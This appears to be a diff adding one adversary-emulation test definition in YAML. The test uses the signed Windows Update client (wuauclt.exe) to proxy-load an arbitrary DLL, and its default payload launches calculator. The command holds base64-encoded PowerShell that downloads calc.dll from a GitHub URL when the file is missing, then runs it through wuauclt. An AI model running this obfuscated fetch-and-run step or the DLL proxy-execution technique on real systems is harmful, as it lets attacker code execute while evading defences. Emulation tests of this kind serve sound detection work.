@@ -1,0 +1,20 @@
+- id: 980d351b-e313-5200-b101-d57fe19c0a49
+  name: Soumaia ART Tests - Load Arbitrary DLL via Wuauclt (Windows Update Client)
+  description: "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/"
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKAB0AGUAcwB0AC0AcABhAHQAaAAgACIALgBcAGMAYQBsAGMALgBkAGwAbAAiACkAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABjAGEAbABjAC4AZABsAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwBiAGwAbwBiAC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADIAMQA4AC8AYgBpAG4ALwBjAGEAbABjAC4AZABsAGwAPwByAGEAdwA9AHQAcgB1AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAGMAYQBsAGMALgBkAGwAbAAiAAoA
+          )
+          wuauclt.exe /UpdateDeploymentProvider ".\calc.dll" /RunHandlerComServer
+        cleanup: |-
+          taskkill /f /im calculator.exe > nul 2>&1
+        payloads:
+        - calc.dll
